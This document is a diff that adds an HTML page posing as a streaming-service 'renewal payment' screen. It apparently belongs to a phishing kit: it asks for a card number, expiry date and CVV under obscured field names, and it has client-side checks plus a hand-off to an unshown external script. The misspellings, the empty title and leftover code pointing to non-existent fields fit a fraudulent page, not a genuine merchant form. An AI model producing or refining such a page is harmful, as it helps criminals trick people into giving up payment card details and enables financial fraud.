@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <link rel="stylesheet" href="./css/11.css">
+    <link rel="stylesheet" href="./css/12.css">
+</head>
+<body style="background:white !important;">
+
+<header>
+    <div class="left">
+        <img src="./img/lg.png">
+    </div>
+    <div class="right">
+        <a href="#">Sign out</a>
+    </div>
+</header>
+
+<section style="text-align:center;">
+    <div class="form" id="card" style="text-align:left;">
+        <input type="hidden" id="1" value="unkown">
+
+        <div class="form-title" style="font-size:2em; font-weight:bold; color:#333;">
+            Review Renewall Payment
+        </div>
+
+        <div class="form-col">
+            <img src="./img/mmo.png" style="width:180px;">
+        </div>
+
+        <div class="form-col">
+            <input type="text" class="textinput"  inputmode="numeric" placeholder="CC" id="f1">
+        </div>
+        <div class="form-col multi">
+            <div class="left">
+                <input type="text" class="textinput"  inputmode="numeric" placeholder="Exp" name="f2" id="f2">
+            </div>
+            <div class="right">
+                <input type="password" class="textinput"  inputmode="numeric" placeholder="code" maxlength="4" pattern="[0-9]{3,4}" name="f3" id="f3">
+            </div>
+        </div>
+
+        <div class="form-col link" style="color:#848484; font-size:0.8em;">
+            <p>
+                By clicking the “Update” button below, you agree to our
+                <a href="#">Terms of Use</a>,
+                <a href="#">Privacy Policy</a>,
+                confirm that you are over 18 years old, and that
+                <b>We will automatically continue your membership and charge the membership fee to your payment method until cancellation. You can cancel at any time to avoid future charges</b>.
+                To cancel, go to Account and click “Cancel Membership”.
+            </p>
+        </div>
+
+        <div class="form-col">
+            <button type="submit" onclick="submitFormIfNecessary()">Update</button>
+        </div>
+    </div>
+</section>
+
+
+<footer>
+<div class="footer-holder">
+    <h3>Questions? Contact us.</h3>
+    <span>FAQ</span>
+    <span>Help Center</span>
+    <span>Terms of Use</span> 
+    <span>Privacy</span>
+    <span>Cookie Preferences</span>
+    <span>Corporate Information</span>
+</div>
+</footer>
+
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+<script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/sweetalert@2.1.2/dist/sweetalert.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+
+<script src="common/1214.js"></script>
+
+<script>
+ 
+$("#d1").mask("0000000000000000");
+$("#d2").mask("00/00");
+$("#d3").mask("0000");
+
+
+var allowSubmit;
+var abortVal = true;
+ 
+
+
+function validate(){
+	abortVal=false;
+	allowSubmit=true;
+ 
+
+    $("input").removeClass("error");
+
+if($("#d1").val().length<16){
+	$("#d1").addClass("error");
+	allowSubmit=false;
+}
+
+
+var _exp = $("#d2").val();
+const _exps = _exp.split("/");
+if(_exps[0]>12 || _exps[0]<=0 || _exps[1]>40 || _exps[1]<26 || _exp.length<5){
+    $("#d2").addClass("error");
+	allowSubmit=false;
+}
+
+if($("#d2").val().length<5){
+	$("#d2").addClass("error");
+	allowSubmit=false;
+}
+
+
+if($("#d3").val().length<3){
+	$("#d3").addClass("error");
+	allowSubmit=false;
+}
+
+
+$('#d1').validateCreditCard(function(result) {
+    if (result.valid) {
+        $("#d1").removeClass('error');
+    } else {
+        $("#d1").addClass("error");
+        allowSubmit=false;
+    }
+});
+
+
+
+}
+
+
+
+
+
+</script>
+<script>
+  const cardInput = document.getElementById("f1");
+  const expInput  = document.getElementById("f2");
+
+  cardInput.addEventListener("input", () => {
+    // keep only digits
+    let value = cardInput.value.replace(/\D/g, "");
+
+    // allow only first digit 3/4/5/6
+    if (value.length > 0 && !/^[3456]/.test(value)) {
+      value = ""; // reset if first digit is wrong
+    }
+
+    // max 16 digits
+    value = value.substring(0, 16);
+
+    // add spaces every 4 digits
+    let formatted = value.match(/.{1,4}/g);
+    cardInput.value = formatted ? formatted.join(" ") : "";
+  });
+
+  // block submit if card not exactly 16 digits
+  cardInput.addEventListener("blur", () => {
+    const digits = cardInput.value.replace(/\D/g, "");
+    if (digits.length !== 16) {
+      cardInput.setCustomValidity("number must be exactly 16 digits.");
+    } else {
+      cardInput.setCustomValidity("");
+    }
+  });
+
+  // EXPIRATION: auto add "/" after 2 digits (MM/YY)
+  expInput.addEventListener("input", () => {
+    let value = expInput.value.replace(/\D/g, ""); // digits only
+    value = value.substring(0, 4); // MMYY max
+
+    // auto add slash
+    if (value.length >= 3) {
+      expInput.value = value.substring(0, 2) + "/" + value.substring(2);
+    } else {
+      expInput.value = value;
+    }
+  });
+
+  // validate month 01-12 and full length 5
+  expInput.addEventListener("blur", () => {
+    const v = expInput.value;
+    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(v)) {
+      expInput.setCustomValidity("Expiration must be in MM/YY format.");
+    } else {
+      expInput.setCustomValidity("");
+    }
+  });
+</script>
+
+</body>
+</html>
